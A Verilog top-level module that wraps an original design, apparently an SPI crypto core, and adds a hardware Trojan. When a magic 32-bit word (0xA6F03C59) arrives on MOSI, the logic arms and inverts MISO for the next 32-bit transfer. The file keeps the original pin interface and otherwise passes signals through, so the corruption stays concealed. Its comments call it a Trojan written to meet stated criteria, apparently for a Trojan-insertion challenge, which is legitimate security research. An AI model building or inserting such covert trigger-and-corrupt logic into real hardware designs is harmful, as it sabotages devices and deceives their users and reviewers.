module recovered (
    input  wire pin_36, // SCK
    input  wire pin_25, // ENC_DEC
    input  wire pin_28, // NORM_CS_N
    input  wire pin_32, // MOSI
    input  wire pin_34, // RST_N
    input  wire pin_27, // START
    output wire pin_38, // BUSY
    output wire pin_23, // ICE_LED
    output wire pin_31  // MISO
);

    wire orig_miso;

    // Instantiate original unmodified design
    recovered_original inst_recovered_original (
        .pin_36(pin_36),
        .pin_25(pin_25),
        .pin_28(pin_28),
        .pin_32(pin_32),
        .pin_34(pin_34),
        .pin_27(pin_27),
        .pin_38(pin_38),
        .pin_23(pin_23),
        .pin_31(orig_miso)
    );

    logic [5:0]  bit_cnt;
    logic        payload_started;
    logic [31:0] shift_reg;
    logic        armed;

    // SCK-clocked domain: Bit counter and payload state tracking
    // pin_28 (CS_N) is safely used as an asynchronous reset for transaction boundaries.
    // pin_34 (RST_N) acts as a synchronous active-low reset on the SCK domain.
    always_ff @(posedge pin_36 or posedge pin_28) begin
        if (pin_28) begin
            bit_cnt         <= 6'b0;
            payload_started <= 1'b0; // Clears predictably on transaction end or interruption
        end else begin
            if (!pin_34) begin
                bit_cnt         <= 6'b0;
                payload_started <= 1'b0;
            end else begin
                // Increment until saturation to prevent wrap-around spoofing
                if (bit_cnt < 6'd63) begin
                    bit_cnt <= bit_cnt + 1'b1;
                end
                
                // Track active payload corruption phase
                if (bit_cnt == 6'd0 && armed) begin
                    payload_started <= 1'b1;
                end else if (bit_cnt == 6'd31) begin
                    // Strict cut-off exactly after 32 bits (prevents exceeding readout corruption)
                    payload_started <= 1'b0;
                end
            end
        end
    end

    // SCK-clocked domain: Trigger logic and arming mechanism
    // No async reset on pin_28 here so 'armed' survives between transactions.
    always_ff @(posedge pin_36) begin
        if (!pin_34) begin
            shift_reg <= 32'b0;
            armed     <= 1'b0; // Meets criteria: RST_N reliably clears Trojan state
        end else if (!pin_28) begin
            shift_reg <= {shift_reg[30:0], pin_32};

            if (bit_cnt == 6'd0 && armed) begin
                // Disarm immediately: payload_started takes over corruption responsibility.
                // Ensures an interrupted payload cleanly aborts without lingering state.
                armed <= 1'b0;
            end else if (bit_cnt == 6'd31) begin
                // Evaluate exact 32-bit transaction trigger matching
                if ({shift_reg[30:0], pin_32} == 32'hA6F03C59) begin
                    armed <= 1'b1;
                end else begin
                    armed <= 1'b0;
                end
            end else if (bit_cnt >= 6'd32) begin
                // Safely clear state if the transaction is malformed (>32 bits)
                armed <= 1'b0;
            end
        end
    end

    // MISO corruption logic:
    // MISO modification is guarded by NORM_CS_N being active (low).
    // `armed` covers the critical 1st bit (CPHA=0 driven on CS edge),
    // and `payload_started` seamlessly handles the remaining 31 bits.
    assign pin_31 = ((armed || payload_started) && !pin_28) ? ~orig_miso : orig_miso;

endmodule
